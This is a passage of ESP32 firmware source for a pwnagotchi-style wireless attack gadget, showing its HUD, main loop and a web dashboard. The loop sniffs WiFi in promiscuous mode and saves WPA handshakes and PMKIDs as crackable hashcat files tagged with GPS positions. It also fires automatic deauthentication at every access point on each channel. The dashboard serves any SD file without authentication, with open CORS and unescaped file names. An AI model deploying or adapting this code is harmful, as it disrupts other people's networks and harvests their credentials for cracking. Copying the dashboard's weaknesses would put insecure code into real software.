  snprintf(buf, sizeof(buf), "%s  age %s", persist.name, age);
  tft.print(buf);

  // Lifetime totals.
  tft.setTextColor(ARA_MID, TFT_BLACK);
  tft.setCursor(10, 112);
  snprintf(buf, sizeof(buf), "Lifetime HS:%lu  PMKID:%lu  run#%lu",
           (unsigned long)persist.totalHandshakes,
           (unsigned long)persist.totalPmkids,
           (unsigned long)persist.sessions);
  tft.print(buf);

  // Session captures.
  tft.setTextColor(ARA_RED, TFT_BLACK);
  tft.setCursor(10, 134);
  snprintf(buf, sizeof(buf), "Sess PMKID:   %lu", (unsigned long)pmkidCount);   tft.print(buf);
  tft.setCursor(10, 150);
  snprintf(buf, sizeof(buf), "Sess HS:      %lu", (unsigned long)handshakeCount); tft.print(buf);

  // Scan stats.
  tft.setTextColor(ARA_MID, TFT_BLACK);
  tft.setCursor(10, 172);
  snprintf(buf, sizeof(buf), "APs seen:     %d", bssidCount);                   tft.print(buf);
  tft.setCursor(10, 188);
  snprintf(buf, sizeof(buf), "Beacons:      %lu", (unsigned long)beaconsSeen);  tft.print(buf);
  tft.setCursor(10, 204);
  snprintf(buf, sizeof(buf), "EAPOL frames: %lu", (unsigned long)eapolSeen);    tft.print(buf);

  tft.setTextColor(ARA_RED, TFT_BLACK);
  tft.setCursor(10, 226);
  snprintf(buf, sizeof(buf), "Ch:%u  dwell:%us  WL:%d  fr:%d",
           currentChannel,
           (unsigned)(curDwellMs / 1000),
           whitelistBssidCount + whitelistSsidCount,
           friendCount);
  tft.print(buf);


  uint32_t up = (millis() - startMs) / 1000;
  tft.setCursor(10, 242);
  snprintf(buf, sizeof(buf), "Sess uptime:  %02lu:%02lu:%02lu",
           (unsigned long)(up / 3600),
           (unsigned long)((up / 60) % 60),
           (unsigned long)(up % 60));
  tft.print(buf);

  // GPS status.
  if (gpsFixValid) {
    tft.setTextColor(ARA_GRN, TFT_BLACK);
    tft.setCursor(10, 260);
    snprintf(buf, sizeof(buf), "GPS: %.4f,%.4f  s%u",
             gpsLat, gpsLon, (unsigned)gpsSatsUsed);
    tft.print(buf);
  } else {
    tft.setTextColor(ARA_DIM, TFT_BLACK);
    tft.setCursor(10, 260);
    snprintf(buf, sizeof(buf), "GPS: searching  q%u s%u",
             (unsigned)gpsFixQ, (unsigned)gpsSatsUsed);
    tft.print(buf);
  }

  tft.setTextColor(sdReady ? ARA_GRN : ARA_RED, TFT_BLACK);
  tft.setCursor(10, 276);
  tft.print(sdReady ? "SD: /captures/.22000+.csv"
                    : "SD: NOT READY (no card?)");
}

// ── Setup / loop / exit ──────────────────────────────────────────────────────
void pwnSetup() {
  pmkidCount = 0;
  handshakeCount = 0;
  framesSeen = 0;
  eapolSeen = 0;
  beaconsSeen = 0;
  bssidCount = 0;
  memset(inflight, 0, sizeof(inflight));
  inflightNext = 0;
  currentChannel = 1;
  uint32_t now = millis();
  channelStartMs = now;
  startMs = now;
  lastCaptureMs = now;
  lastDeauthMs = now;
  lastFaceMs = 0;
  lastHudMs = 0;
  currentFace = Face::IDLE;
  lastDrawnFace = (Face)(-1);
  autoDeauth = true;

  sdReady = (SD.cardSize() > 0);

  persistLoad();
  persist.sessions++;
  persistDirty = true;
  uptimeAccumMs = 0;

  loadWhitelist();
  memset(chanStats, 0, sizeof(chanStats));
  curDwellMs = PWN_CHANNEL_DWELL_MS;

  pwnGpsBegin();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&rxCallback);
  esp_wifi_set_promiscuous(true);
  // Initialize per-channel snapshots after promiscuous is up so counters are sane.
  snapEapol   = eapolSeen;
  snapBeacons = beaconsSeen;

  drawShell();
  drawFace();
  drawHud();
}

void pwnLoop() {
  uint32_t now = millis();

  pwnGpsFeed();
  persistTickUptime(now);

  // Track best-session counter.
  uint16_t sessTotal = (uint16_t)(pmkidCount + handshakeCount);
  if (sessTotal > persist.bestSession) {
    persist.bestSession = sessTotal;
    persistDirty = true;
  }

  // Save on debounce after a capture, or on heartbeat.
  persistMaybeSave(now);
  static uint32_t lastHeartbeatMs = 0;
  if ((uint32_t)(now - lastHeartbeatMs) >= PWN_SAVE_HEARTBEAT_MS) {
    lastHeartbeatMs = now;
    persistDirty = true;
    persistSaveNow();
  }

  // Adaptive channel hop.
  if (now - channelStartMs >= curDwellMs) {
    closeOutChannel();
    openChannel(pickNextChannel());
    channelStartMs = now;
  }

  // Friend-beacon broadcast + table aging.
  if ((uint32_t)(now - lastFriendTxMs) >= PWN_FRIEND_TX_INTERVAL_MS) {
    lastFriendTxMs = now;
    transmitFriendBeacon();
    friendsExpire();
  }

  // Auto-deauth.
  if (autoDeauth && bssidCount > 0 && (now - lastDeauthMs) >= PWN_DEAUTH_INTERVAL_MS) {
    lastDeauthMs = now;
    currentFace = Face::ANGRY;
    drawFace();
    deauthOnCurrentChannel();
  }

  // Mood update.
  if (now - lastFaceMs > 800) {
    lastFaceMs = now;
    Face nf;
    if (now - lastCaptureMs < PWN_FACE_HAPPY_MS)     nf = Face::HAPPY;
    else if (now - lastCaptureMs > PWN_FACE_SAD_MS)  nf = Face::SAD;
    else                                              nf = Face::WATCH;
    if (currentFace != Face::ANGRY) currentFace = nf;
    if (currentFace != lastDrawnFace) drawFace();
  }

  // HUD refresh.
  if (now - lastHudMs > 500) {
    lastHudMs = now;
    drawHud();
  }

  // Manual deauth on RIGHT.
  if (!pcf.digitalRead(BTN_RIGHT)) {
    currentFace = Face::ANGRY;
    drawFace();
    deauthOnCurrentChannel();
    lastDeauthMs = now;
    delay(300);
  }

  if (isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
  }
}

void pwnExit() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  pwnGpsEnd();
  persistTickUptime(millis());
  persistDirty = true;
  persistSaveNow();
}

}  // namespace PwnMode


/* ════════════════════════════════════════════════════════════════════════════
   WebDashboard — small HTTP server on port 80. Serves a single-page web UI
   plus JSON API endpoints over the WiFi creds saved by OtaGithub / WifiSetup.
   ════════════════════════════════════════════════════════════════════════════ */
namespace OtaGithub {
  bool _loadCreds(String&, String&);
}

namespace WebDashboard {

static WebServer dashServer(80);
static bool      serverUp     = false;
static bool      wifiUp       = false;
static uint32_t  startMs      = 0;
static uint32_t  lastDrawMs   = 0;
static int       reqCount     = 0;

static const uint16_t WD_RED  = 0xE0E6;
static const uint16_t WD_DIM  = 0x6020;
static const uint16_t WD_GRN  = 0x07C0;

// Embedded single-page UI (mobile-first, dark Arasaka palette).
static const char INDEX_HTML[] PROGMEM = R"HTML(<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Dark-Div</title>
<style>
:root{--bg:#0b0b0d;--fg:#ff2c3c;--dim:#6a1722;--mut:#9085;}
*{box-sizing:border-box}html,body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.45 ui-monospace,Menlo,monospace}
header{padding:14px 16px;border-bottom:1px solid var(--dim);display:flex;justify-content:space-between;align-items:center}
header h1{margin:0;font-size:16px;letter-spacing:2px}
nav{display:flex;gap:0;border-bottom:1px solid var(--dim);overflow:auto}
nav button{flex:1;padding:12px;background:transparent;color:var(--fg);border:0;border-right:1px solid var(--dim);font:inherit;cursor:pointer}
nav button.active{background:var(--dim);color:#fff}
main{padding:14px 16px}
.kv{display:grid;grid-template-columns:130px 1fr;gap:6px 12px;font-size:13px}
.kv b{color:var(--fg);font-weight:normal}.kv span{color:#fff;word-break:break-all}
ul{list-style:none;padding:0;margin:8px 0}
li{padding:8px 0;border-bottom:1px solid var(--dim);display:flex;justify-content:space-between;gap:8px}
a{color:var(--fg);text-decoration:none}a:hover{color:#fff}
.muted{color:#888;font-size:12px}
.tag{font-size:11px;color:var(--bg);background:var(--fg);padding:2px 6px;border-radius:3px}
.face{font-size:32px;text-align:center;padding:14px;color:#fff}
.row{display:flex;gap:8px;flex-wrap:wrap;margin:8px 0}
.row a,.row button{padding:8px 12px;border:1px solid var(--dim);background:transparent;color:var(--fg);font:inherit;cursor:pointer}
.row a:hover,.row button:hover{background:var(--dim);color:#fff}
</style></head><body>
<header><h1>[ DARK-DIV ]</h1><span class=muted id=ip></span></header>
<nav>
 <button class=active data-tab=status>Status</button>
 <button data-tab=pwn>Pwn</button>
 <button data-tab=cap>Captures</button>
 <button data-tab=sd>SD</button>
</nav>
<main id=main></main>
<script>
const $=s=>document.querySelector(s);
let tab='status';
async function get(p){const r=await fetch(p);return r.ok?r.json():null}
function fmt(n){return new Intl.NumberFormat().format(n)}
function fmtBytes(n){if(n<1024)return n+' B';if(n<1048576)return (n/1024).toFixed(1)+' KB';return (n/1048576).toFixed(1)+' MB'}
function fmtAge(s){const d=s/86400|0;s%=86400;const h=s/3600|0;s%=3600;const m=s/60|0;if(d)return d+'d '+h+'h';if(h)return h+'h '+m+'m';return m+'m'}
function fmtUptime(ms){const s=ms/1000|0;return fmtAge(s)}
async function status(){const j=await get('/api/info');if(!j){$('#main').textContent='offline';return}
  $('#ip').textContent=j.ip;
  $('#main').innerHTML=`<div class=kv>
  <b>Device</b><span>${j.device}</span>
  <b>Firmware</b><span>${j.version}</span>
  <b>WiFi SSID</b><span>${j.ssid||'-'}</span>
  <b>IP</b><span>${j.ip}</span>
  <b>MAC</b><span>${j.mac}</span>
  <b>RSSI</b><span>${j.rssi} dBm</span>
  <b>Uptime</b><span>${fmtUptime(j.uptime_ms)}</span>
  <b>Free heap</b><span>${fmtBytes(j.free_heap)}</span>
  <b>PSRAM free</b><span>${fmtBytes(j.free_psram)}</span>
  <b>SD card</b><span>${j.sd_mounted?fmtBytes(j.sd_total)+' total':'NOT MOUNTED'}</span>
  <b>Battery</b><span>${j.battery_v.toFixed(2)} V</span>
  <b>Requests served</b><span>${j.req_count}</span></div>`}
async function pwn(){const j=await get('/api/pwn');if(!j){$('#main').textContent='no /pwn/state.json';return}
  $('#main').innerHTML=`<div class=face>( ^_^ )</div><div class=kv>
  <b>Name</b><span>${j.name}</span>
  <b>Age</b><span>${fmtAge(j.uptime_s)}</span>
  <b>Lifetime HS</b><span>${fmt(j.handshakes)}</span>
  <b>Lifetime PMKIDs</b><span>${fmt(j.pmkids)}</span>
  <b>Sessions</b><span>${fmt(j.sessions)}</span>
  <b>Best session</b><span>${fmt(j.best)}</span></div>`}
async function caps(){const j=await get('/api/captures');if(!j){$('#main').textContent='no /captures dir';return}
  if(!j.files.length){$('#main').innerHTML='<p class=muted>No captures yet</p>';return}
  $('#main').innerHTML='<ul>'+j.files.map(f=>`<li><a href="/api/dl?path=/captures/${encodeURIComponent(f.name)}">${f.name}</a><span class=tag>${fmtBytes(f.size)}</span></li>`).join('')+'</ul>'}
async function sd(path='/'){const j=await get('/api/sd?path='+encodeURIComponent(path));if(!j){$('#main').textContent='SD error';return}
  let html=`<div class=row><span class=muted>${path}</span></div><ul>`;
  if(path!=='/'){const up=path.split('/').slice(0,-1).join('/')||'/';html+=`<li><a href="#" data-dir="${up}">.. (up)</a></li>`}
  for(const f of j.entries){
    if(f.dir)html+=`<li><a href="#" data-dir="${f.path}">${f.name}/</a></li>`;
    else html+=`<li><a href="/api/dl?path=${encodeURIComponent(f.path)}">${f.name}</a><span class=tag>${fmtBytes(f.size)}</span></li>`;
  }
  $('#main').innerHTML=html+'</ul>';
  document.querySelectorAll('[data-dir]').forEach(a=>a.onclick=e=>{e.preventDefault();sd(a.dataset.dir)})}
function load(){if(tab==='status')status();else if(tab==='pwn')pwn();else if(tab==='cap')caps();else if(tab==='sd')sd('/')}
document.querySelectorAll('nav button').forEach(b=>b.onclick=()=>{document.querySelectorAll('nav button').forEach(x=>x.classList.remove('active'));b.classList.add('active');tab=b.dataset.tab;load()});
load();setInterval(()=>{if(tab==='status'||tab==='pwn')load()},5000);
</script></body></html>)HTML";

static const char* sdSizeBytes(uint64_t n, char* out, size_t cap) {
  snprintf(out, cap, "%llu", (unsigned long long)n);
  return out;
}

static void sendJsonHeader() {
  dashServer.sendHeader("Cache-Control", "no-store");
  dashServer.sendHeader("Access-Control-Allow-Origin", "*");
}

static void handleRoot() {
  reqCount++;
  dashServer.sendHeader("Cache-Control", "no-store");
  dashServer.send_P(200, "text/html; charset=utf-8", INDEX_HTML);
}

static void handleInfo() {
  reqCount++;
  String ssid, pw;
  OtaGithub::_loadCreds(ssid, pw);
  bool sdMounted = (SD.cardSize() > 0);
  uint8_t mac[6]; esp_read_mac(mac, ESP_MAC_WIFI_STA);
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  char sdTot[24]; sdSizeBytes(sdMounted ? SD.cardSize() : 0, sdTot, sizeof(sdTot));

  String out;
  out.reserve(512);
  out  = "{\"device\":\"ESP32-DIV V2\",\"version\":\"Dark-Div\",";
  out += "\"ssid\":\"" + ssid + "\",";
  out += "\"ip\":\""   + WiFi.localIP().toString() + "\",";
  out += "\"mac\":\""  + String(macStr) + "\",";
  out += "\"rssi\":"   + String(WiFi.RSSI()) + ",";
  out += "\"uptime_ms\":" + String((uint32_t)millis()) + ",";
  out += "\"free_heap\":" + String((uint32_t)ESP.getFreeHeap()) + ",";
  out += "\"free_psram\":" + String((uint32_t)ESP.getFreePsram()) + ",";
  out += "\"sd_mounted\":" + String(sdMounted ? "true" : "false") + ",";
  out += "\"sd_total\":"   + String(sdTot) + ",";
  out += "\"battery_v\":"  + String(readBatteryVoltage(), 2) + ",";
  out += "\"req_count\":"  + String(reqCount);
  out += "}";

  sendJsonHeader();
  dashServer.send(200, "application/json", out);
}

static void handlePwn() {
  reqCount++;
  if (!SD.exists("/pwn/state.json")) {
    sendJsonHeader();
    dashServer.send(404, "application/json", "{\"error\":\"no state\"}");
    return;
  }
  File f = SD.open("/pwn/state.json", FILE_READ);
  if (!f) {
    sendJsonHeader();
    dashServer.send(500, "application/json", "{\"error\":\"sd open failed\"}");
    return;
  }
  String body;
  body.reserve((size_t)f.size() + 16);
  while (f.available()) body += (char)f.read();
  f.close();
  sendJsonHeader();
  dashServer.send(200, "application/json", body);
}

static void appendDirJson(String& out, const String& path, bool listSubdirs) {
  File dir = SD.open(path);
  if (!dir || !dir.isDirectory()) { out += "[]"; return; }
  out += "[";
  bool first = true;
  while (true) {
    File e = dir.openNextFile();
    if (!e) break;
    String nm = String(e.name());
    // ESP-IDF returns paths with full prefix on some builds; strip to leaf.
    int slash = nm.lastIndexOf('/');
    String leaf = (slash >= 0) ? nm.substring(slash + 1) : nm;
    String full = path;
    if (!full.endsWith("/")) full += "/";
    full += leaf;
    if (!first) out += ",";
    first = false;
    out += "{\"name\":\"" + leaf + "\",\"path\":\"" + full + "\",\"size\":" + String((uint32_t)e.size())
         + ",\"dir\":" + String(e.isDirectory() ? "true" : "false") + "}";
    e.close();
    if (!listSubdirs) {
      // Cap output at a reasonable size when listing all files.
      if (out.length() > 16000) break;
    }
  }
  dir.close();
  out += "]";
}

static void handleCaptures() {
  reqCount++;
  String out = "{\"files\":";
  appendDirJson(out, "/captures", true);
  out += "}";
  sendJsonHeader();
  dashServer.send(200, "application/json", out);
}

static void handleSdList() {
  reqCount++;
  String path = dashServer.hasArg("path") ? dashServer.arg("path") : "/";
  if (path.length() == 0) path = "/";
  String out = "{\"path\":\"" + path + "\",\"entries\":";
  appendDirJson(out, path, true);
  out += "}";
  sendJsonHeader();
  dashServer.send(200, "application/json", out);
}

static void handleDownload() {
  reqCount++;
  if (!dashServer.hasArg("path")) {
    dashServer.send(400, "text/plain", "missing path");
    return;
  }
  String path = dashServer.arg("path");
  File f = SD.open(path, FILE_READ);
  if (!f) {
    dashServer.send(404, "text/plain", "not found");
    return;
  }
  dashServer.sendHeader("Content-Disposition",
                        String("attachment; filename=\"") +
                        path.substring(path.lastIndexOf('/') + 1) + "\"");
  dashServer.streamFile(f, "application/octet-stream");
  f.close();
}

static void handleNotFound() {
  dashServer.send(404, "text/plain", "404");
}

// ── UI screen ────────────────────────────────────────────────────────────────
static void drawShell() {
  tft.fillScreen(TFT_BLACK);
  tft.drawFastHLine(0, 0, 240, WD_RED);
  tft.drawFastHLine(0, 24, 240, WD_DIM);
  tft.drawFastHLine(0, 296, 240, WD_DIM);
  tft.drawFastHLine(0, 319, 240, WD_RED);
  tft.setTextFont(2);
  tft.setTextSize(1);
  tft.setTextColor(WD_RED, TFT_BLACK);
  tft.setCursor(50, 6);
  tft.print("[ WEB DASHBOARD ]");
  tft.setTextColor(WD_DIM, TFT_BLACK);
  tft.setCursor(8, 301);
  tft.print("Hold SELECT to exit");
}

static void drawStatus() {
  tft.fillRect(0, 30, 240, 260, TFT_BLACK);
  tft.setTextFont(2);
  tft.setTextSize(1);
  char buf[64];

  if (!wifiUp) {
    tft.setTextColor(WD_RED, TFT_BLACK);
    tft.setCursor(10, 40);
    tft.print("WiFi not connected.");
    tft.setCursor(10, 60);
    tft.print("Open Settings -> WiFi");
    tft.setCursor(10, 76);
    tft.print("to set credentials.");
    return;
  }

  tft.setTextColor(WD_GRN, TFT_BLACK);
  tft.setCursor(10, 40);
  snprintf(buf, sizeof(buf), "Online: %s", WiFi.SSID().c_str());
  tft.print(buf);

  tft.setTextColor(WD_RED, TFT_BLACK);
  tft.setCursor(10, 64);
  snprintf(buf, sizeof(buf), "IP:   %s", WiFi.localIP().toString().c_str());
  tft.print(buf);
  tft.setCursor(10, 84);
  snprintf(buf, sizeof(buf), "RSSI: %d dBm", WiFi.RSSI());
  tft.print(buf);

  tft.setTextColor(WD_RED, TFT_BLACK);
  tft.setCursor(10, 116);
  tft.print("Open in your browser:");
  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setCursor(10, 134);
  snprintf(buf, sizeof(buf), "http://%s/", WiFi.localIP().toString().c_str());
  tft.print(buf);

  tft.setTextColor(WD_DIM, TFT_BLACK);
  tft.setCursor(10, 168);
  tft.print("Tabs: Status / Pwn /");
  tft.setCursor(10, 184);
  tft.print("      Captures / SD");

  tft.setTextColor(WD_RED, TFT_BLACK);
  tft.setCursor(10, 216);
  uint32_t up = (millis() - startMs) / 1000;
  snprintf(buf, sizeof(buf), "Up:   %02lu:%02lu:%02lu",
           (unsigned long)(up / 3600),
           (unsigned long)((up / 60) % 60),
           (unsigned long)(up % 60));
  tft.print(buf);

  tft.setCursor(10, 232);
  snprintf(buf, sizeof(buf), "Requests served: %d", reqCount);
  tft.print(buf);

  tft.setCursor(10, 256);
  snprintf(buf, sizeof(buf), "Heap: %u KB",
           (unsigned)(ESP.getFreeHeap() / 1024));
  tft.print(buf);
}

// ── Setup / loop / exit ──────────────────────────────────────────────────────
void setup() {
  reqCount = 0;
  startMs  = millis();
  wifiUp   = false;
  serverUp = false;
  drawShell();

  String ssid, pw;
  if (!OtaGithub::_loadCreds(ssid, pw)) {
    drawStatus();
    return;
  }

  tft.setTextColor(WD_RED, TFT_BLACK);
  tft.setTextFont(2); tft.setTextSize(1);
  tft.setCursor(10, 40); tft.print("Connecting to WiFi...");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);
  WiFi.begin(ssid.c_str(), pw.c_str());
  uint32_t t0 = millis();
  while (WiFi.status() != WL_CONNECTED && (millis() - t0) < 12000) {
    delay(200);
  }
  if (WiFi.status() != WL_CONNECTED) {
    tft.setTextColor(WD_RED, TFT_BLACK);
    tft.setCursor(10, 60); tft.print("Connect failed.");
    return;
  }
  wifiUp = true;

  dashServer.on("/",              handleRoot);
  dashServer.on("/api/info",      handleInfo);
  dashServer.on("/api/pwn",       handlePwn);
  dashServer.on("/api/captures",  handleCaptures);
  dashServer.on("/api/sd",        handleSdList);
  dashServer.on("/api/dl",        handleDownload);
  dashServer.onNotFound(handleNotFound);
  dashServer.begin();
  serverUp = true;

  drawStatus();
  lastDrawMs = millis();
}

void loop() {
  if (serverUp) dashServer.handleClient();

  uint32_t now = millis();
  if ((uint32_t)(now - lastDrawMs) > 1000) {
    lastDrawMs = now;
    drawStatus();
  }

  if (isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
  }
  delay(2);
}

void exit() {
  if (serverUp) {
    dashServer.stop();
    serverUp = false;
  }
}

}  // namespace WebDashboard

